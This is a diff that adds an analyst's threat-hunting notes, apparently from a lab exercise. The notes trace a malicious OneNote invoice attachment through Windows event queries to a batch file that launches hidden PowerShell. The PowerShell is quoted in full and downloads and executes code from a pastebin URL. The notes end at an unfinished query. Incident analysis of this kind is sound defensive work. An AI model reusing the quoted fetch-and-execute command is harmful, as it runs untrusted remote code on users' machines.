@@ -1,0 +1,26 @@
+event.code:15 AND file.name:*invoice.one
+	at around Mar 26, 2023 @ 22:05:47.791
+	invoice.one seen in C:\Users\bob\Downloads
+	with hash: aaee893b24c9474b23e94c725a67d83f2722e4fed8ba8c25ce60bd76b30c0954
+	on WS001, 192.168.28.130
+
+
+source.ip:192.168.28.130 AND dns.question.name:*		
+	dns query for the following seen around time: file.io, followed by nav-edge.smartscreen.microsoft.com
+	i think file.io has ip 192.168.28.200
+
+event.code:1 AND process.command_line:*invoice.one*
+	You see OneNote.exe is what gets accessed.
+	Want to look for any child processes
+
+event.code:1 AND process.parent.name:"ONENOTE.EXE"
+	Spawned cmd.exe (9876) and ONENOTEM.EXE (5056, 9592)
+	cmd.exe has process command line of C:\WINDOWS\system32\cmd.exe /c ""C:\Users\bob\AppData\Local\Temp\OneNote\16.0\Exported\{EC284AA9-1F31-4DC4-B3C5-3EEE8137EBC3}\NT\0\invoice.bat"
+	Let's check for bat
+
+event.code:1 AND process.parent.command_line:*invoice.bat*
+	pid: 9944
+	powershell.exe  -nop -w hidden -noni -noexit "iex (iwr https://pastebin.com/raw/33Z1jP6J -usebasicparsing)"
+	Let's see what this command did
+
+process.pid:9944 AND process.name:"powershell.exe" 
